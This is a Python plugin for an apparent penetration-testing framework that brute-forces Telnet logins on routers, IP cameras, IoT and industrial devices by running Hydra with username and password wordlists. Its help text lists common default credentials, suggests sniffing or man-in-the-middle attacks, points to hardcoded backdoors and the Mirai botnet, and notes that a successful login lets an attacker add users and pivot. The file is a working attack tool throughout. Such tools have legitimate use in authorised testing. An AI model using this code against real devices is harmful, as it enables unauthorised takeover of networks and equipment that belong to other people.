#!/usr/bin/env python3
"""
souleyez.plugins.router_telnet_brute

Router Telnet brute force plugin using Hydra.
Targets routers with Telnet management enabled.
"""

import subprocess
import time
from typing import List

from souleyez.security.validation import ValidationError, validate_target

from .plugin_base import PluginBase

HELP = {
    "name": "Router Telnet Brute — Telnet Login Attack",
    "description": (
        "Brute force router Telnet login with common credentials.\n\n"
        "Telnet is still enabled on many routers, especially:\n"
        "- Older consumer routers\n"
        "- ISP-provided modems/gateways\n"
        "- IoT devices and IP cameras\n"
        "- Industrial/SCADA equipment\n\n"
        "Telnet transmits credentials in plaintext - if you can sniff the "
        "connection, you don't need to brute force!\n\n"
        "Quick tips:\n"
        "- Telnet is unencrypted - easy to MITM\n"
        "- Many devices have hardcoded Telnet backdoors\n"
        "- Check port 23 (standard) and 2323 (alternate)\n"
        "- Often uses same creds as web interface\n"
    ),
    "usage": "souleyez jobs enqueue router_telnet_brute <target>",
    "examples": [
        "souleyez jobs enqueue router_telnet_brute 192.168.1.1",
        'souleyez jobs enqueue router_telnet_brute 192.168.1.1 --args "--port 2323"',
    ],
    "flags": [
        ["--port PORT", "Telnet port (default: 23)"],
    ],
    "presets": [
        {
            "name": "Standard Telnet",
            "args": [],
            "desc": "Port 23 with router credentials",
        },
        {
            "name": "Alt Port 2323",
            "args": ["--port", "2323"],
            "desc": "Common alternate Telnet port",
        },
    ],
    "help_sections": [
        {
            "title": "What is Router Telnet Brute Force?",
            "color": "cyan",
            "content": [
                (
                    "Overview",
                    [
                        "Brute forces Telnet login on routers and IoT devices",
                        "Telnet transmits credentials in PLAINTEXT!",
                        "Still common on older and budget network devices",
                    ],
                ),
                (
                    "Common Targets",
                    [
                        "Older consumer routers (Linksys, Netgear, D-Link)",
                        "ISP-provided modems and gateways",
                        "IP cameras and NVR systems",
                        "Industrial/SCADA equipment",
                        "IoT devices (smart home, printers)",
                    ],
                ),
            ],
        },
        {
            "title": "Usage & Examples",
            "color": "green",
            "content": [
                (
                    "Basic Usage",
                    [
                        "souleyez jobs enqueue router_telnet_brute 192.168.1.1",
                        "  → Tests default router credentials on port 23",
                    ],
                ),
                (
                    "Alternate Port",
                    [
                        'souleyez jobs enqueue router_telnet_brute 192.168.1.1 --args "--port 2323"',
                        "  → Tests on alternate Telnet port (common for IoT)",
                    ],
                ),
            ],
        },
        {
            "title": "Tips & Security Notes",
            "color": "yellow",
            "content": [
                (
                    "Telnet Security Issues",
                    [
                        "PLAINTEXT protocol - can sniff credentials on network",
                        "Consider MITM attack instead of brute force",
                        "Many devices have hardcoded backdoor accounts",
                        "Mirai botnet exploited default Telnet credentials",
                    ],
                ),
                (
                    "Common Telnet Defaults",
                    [
                        "admin:admin, root:root, admin:password",
                        "admin:<blank>, root:<blank>",
                        "user:user, support:support",
                        "Device-specific defaults (check online)",
                    ],
                ),
                (
                    "After Success",
                    [
                        "Full command-line access to device",
                        "Often same access level as SSH",
                        "Can modify configs, add users, pivot",
                    ],
                ),
            ],
        },
    ],
}


class RouterTelnetBrutePlugin(PluginBase):
    name = "Router Telnet Brute"
    tool = "hydra"
    category = "exploitation"
    HELP = HELP

    def _get_wordlist_path(self, filename: str) -> str:
        """Get path to wordlist file."""
        from souleyez.wordlists import resolve_wordlist_path

        return resolve_wordlist_path(f"data/wordlists/{filename}")

    def build_command(
        self, target: str, args: List[str] = None, label: str = "", log_path: str = None
    ):
        """Build Hydra command for router Telnet brute force."""
        args = args or []

        try:
            target = validate_target(target)
        except ValidationError as e:
            if log_path:
                with open(log_path, "w") as f:
                    f.write(f"ERROR: Invalid target: {e}\n")
            return None

        port = "23"
        i = 0
        while i < len(args):
            if args[i] == "--port" and i + 1 < len(args):
                port = args[i + 1]
                i += 2
            else:
                i += 1

        users = self._get_wordlist_path("router_users.txt")
        passwords = self._get_wordlist_path("router_passwords.txt")

        cmd = [
            "hydra",
            "-L",
            users,
            "-P",
            passwords,
            "-s",
            port,
            "-t",
            "2",
            "-w",
            "3",
            "-vV",
            "-f",
            target,
            "telnet",
        ]

        return {"cmd": cmd, "timeout": 1800}

    def run(
        self, target: str, args: List[str] = None, label: str = "", log_path: str = None
    ) -> int:
        """Execute router Telnet brute force."""
        cmd_spec = self.build_command(target, args, label, log_path)
        if cmd_spec is None:
            return 1

        cmd = cmd_spec["cmd"]

        if log_path:
            with open(log_path, "w") as f:
                f.write(f"# Router Telnet Brute Force on {target}\n")
                f.write(f"# Command: {' '.join(cmd)}\n")
                f.write(f"# Started: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")

        try:
            with open(log_path, "a") as f:
                result = subprocess.run(
                    cmd, stdout=f, stderr=subprocess.STDOUT, timeout=cmd_spec["timeout"]
                )
            return result.returncode
        except subprocess.TimeoutExpired:
            if log_path:
                with open(log_path, "a") as f:
                    f.write("\n\n# ERROR: Brute force timed out\n")
            return 124
        except Exception as e:
            if log_path:
                with open(log_path, "a") as f:
                    f.write(f"\n\n# ERROR: {e}\n")
            return 1


plugin = RouterTelnetBrutePlugin()
